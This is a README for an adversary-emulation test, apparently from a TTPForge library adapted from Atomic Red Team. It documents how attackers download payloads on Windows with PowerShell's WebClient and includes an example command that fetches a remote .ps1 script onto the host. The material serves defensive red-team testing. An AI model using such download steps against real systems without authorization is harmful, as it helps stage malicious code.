# Windows - PowerShell Download

## Description
Downloads payloads using PowerShell's System.Net.WebClient class. Widely used by adversaries due to its simplicity, availability on all Windows systems, and ability to bypass some security controls.

Adapted from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team)

## Arguments
- **remote_file**: URL of file to copy (default: `https://raw.githubusercontent.com/redcanaryco/atomic-red-team/dd526047b8c399c312fee47d1e6fb531164da54d/LICENSE.txt`)
- **local_file**: Local path to place file (default: `C:\Users\Public\malicious.bin`)

## Example(s)
You can run this TTP with the following command:
```bash
ttpforge run forgearmory//command-and-control/download-using-powershell/ttp.yaml \
  --remote_file "https://example.com/tool.ps1" \
  --local_file "C:\Temp\script.ps1"
```

## Steps
1. **download_file_with_powershell**: Creates a new System.Net.WebClient object and uses its DownloadFile method to download a file from the specified remote URL to the destination path.
